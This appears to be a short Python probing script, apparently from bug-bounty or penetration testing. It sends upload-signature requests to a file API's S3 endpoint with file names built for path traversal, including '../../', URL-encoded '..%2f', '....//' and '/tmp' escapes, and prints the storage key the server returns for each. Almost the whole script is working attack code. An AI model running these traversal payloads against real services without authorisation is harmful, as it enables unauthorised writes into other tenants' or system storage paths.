import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(path,body):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
for fn in ["zx-normal.pdf","../../demo-certs-dkim_demo/zx-trav.pdf","..%2f..%2fdemo-certs-dkim_demo%2fzx-t2.pdf","../../../../tmp/zx-t3.pdf","....//demo-certs-dkim_demo/zx-t4.pdf"]:
    c,b=req('/api/v1/files/s3_upload_signature',{"file_name":fn,"model_name":None,"model_id":None,"content_hash":"x"})
    try:
        d=json.loads(b); fd=d.get('formData') or {}
        print(f"--- {fn}")
        print("    key:",repr(fd.get('key')))
    except Exception as e: print(f"--- {fn}: {c} {b[:150]}")
